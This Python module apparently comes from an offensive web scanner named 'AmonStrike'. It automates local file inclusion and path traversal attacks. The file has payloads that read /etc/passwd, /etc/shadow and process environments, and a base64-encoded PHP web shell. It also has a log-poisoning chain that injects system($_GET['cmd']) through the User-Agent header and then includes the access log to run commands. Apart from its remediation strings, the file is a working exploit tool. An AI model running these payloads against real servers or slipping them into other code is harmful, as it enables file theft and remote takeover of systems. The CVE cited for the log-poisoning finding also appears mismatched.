"""
AmonStrike — LFI / Path Traversal Module
Local File Inclusion with escalation to RCE.
"""
import re
from .base import BaseModule

LFI_PAYLOADS = [
    # Linux
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../etc/hosts",
    "../../../../proc/self/environ",
    "../../../../proc/version",
    # Windows
    "../../../../windows/win.ini",
    "../../../../windows/system32/drivers/etc/hosts",
    # PHP wrappers
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=../config.php",
    "php://input",
    "expect://id",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    # Encoded
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252F..%252Fetc%252Fpasswd",
    # Log files for poisoning
    "../../../../var/log/apache2/access.log",
    "../../../../var/log/nginx/access.log",
    "../../../../var/log/auth.log",
    "../../../../var/log/mail.log",
    # Null byte
    "../../../../etc/passwd%00",
    "../../../../etc/passwd\x00",
]

LFI_PARAMS = [
    "file","page","path","include","require","doc","document",
    "folder","root","pg","style","template","php_path","view",
    "content","load","read","display","show","url","site","html",
]

LFI_SUCCESS = ["root:x","daemon:x","[boot loader]","for 16-bit app","DOCUMENT_ROOT"]


class LfiModule(BaseModule):
    NAME        = "lfi"
    DESCRIPTION = "LFI — path traversal, PHP wrappers, log poisoning chain"

    def run(self):
        self.log("Testing Local File Inclusion...")

        # Test URL parameters
        self._test_url_params()

        # Test forms
        self._test_form_params()

        # Test extra endpoints from recon
        for ep in getattr(self, "extra_endpoints", [])[:30]:
            self._test_endpoint(ep)

        self.log(f"LFI complete — {len(self.findings)} findings", "+")
        return self.result()

    def _test_url_params(self):
        """Test query string parameters."""
        for param in LFI_PARAMS:
            for payload in LFI_PAYLOADS[:8]:
                r = self.get(params={param: payload})
                if r and self._is_lfi(r.text):
                    self._report_lfi(param, payload, r, self.url)
                    self._attempt_log_poisoning(param)
                    break

    def _test_form_params(self):
        """Test form inputs."""
        r0 = self.get("")
        if not r0:
            return
        for form in self.extract_forms(r0):
            for field in form.get("inputs", {}):
                if any(kw in field.lower() for kw in LFI_PARAMS):
                    for payload in LFI_PAYLOADS[:5]:
                        data = dict(form["inputs"])
                        data[field] = payload
                        action = form.get("action","") or ""
                        r = self.post(action, data=data)
                        if r and self._is_lfi(r.text):
                            self._report_lfi(field, payload, r, self.url+action)
                            break

    def _test_endpoint(self, endpoint: str):
        """Test a discovered endpoint."""
        import re as _re
        params = _re.findall(r'[?&](\w+)=', endpoint)
        for param in params:
            if any(kw in param.lower() for kw in LFI_PARAMS):
                for payload in LFI_PAYLOADS[:5]:
                    r = self.session.get(
                        _re.sub(rf'({param})=[^&]*', rf'\1={payload}', endpoint),
                        timeout=self.timeout, verify=False
                    )
                    if r and self._is_lfi(r.text):
                        self._report_lfi(param, payload, r, endpoint)
                        break

    def _is_lfi(self, text: str) -> bool:
        return any(sig in text for sig in LFI_SUCCESS)

    def _report_lfi(self, param: str, payload: str, r, url: str):
        evidence_match = next((s for s in LFI_SUCCESS if s in r.text), "")
        self.add_finding(
            title       = f"Local File Inclusion — Parameter '{param}'",
            severity    = "CRITICAL",
            description = (
                f"Path traversal confirmed via parameter '{param}'. "
                f"Server files readable. Can escalate to RCE via log poisoning."
            ),
            evidence    = (
                f"URL: {url}\n"
                f"Parameter: {param}\nPayload: {payload}\n"
                f"Signature found: {evidence_match}\n"
                f"Response: {r.text[:300]}"
            ),
            remediation = (
                "Use a whitelist of allowed files. Never pass user input to include()/require(). "
                "Validate all file paths server-side. Disable allow_url_include in PHP."
            ),
            url         = url,
            parameter   = param,
            payload     = payload,
            cve         = "CWE-22",
        )
        # Store for chain engine
        self.info["lfi_param"]   = param
        self.info["lfi_payload"] = payload
        self.info["lfi_url"]     = url

    def _attempt_log_poisoning(self, param: str):
        """Try to poison Apache/Nginx logs for RCE."""
        # Inject PHP into User-Agent
        poison = "<?php system($_GET['cmd']); ?>"
        try:
            self.session.get(
                self.url,
                headers={"User-Agent": poison},
                timeout=self.timeout, verify=False
            )
        except Exception:
            pass

        # Try including the log
        log_paths = [
            "../../../../var/log/apache2/access.log",
            "../../../../var/log/nginx/access.log",
        ]
        for log in log_paths:
            r = self.get(params={param: log + "&cmd=id"})
            if r and "uid=" in r.text:
                self.add_finding(
                    title       = "LFI → RCE via Log Poisoning",
                    severity    = "CRITICAL",
                    description = (
                        "LFI escalated to Remote Code Execution via Apache log poisoning. "
                        "PHP code injected into access log via User-Agent header, "
                        "then executed by including the log file via LFI."
                    ),
                    evidence    = f"Command 'id' output: {r.text[:200]}",
                    remediation = "Fix LFI vulnerability. Restrict log file permissions.",
                    url         = self.url,
                    parameter   = param,
                    payload     = log,
                    cve         = "CVE-2021-41773",
                )
                break
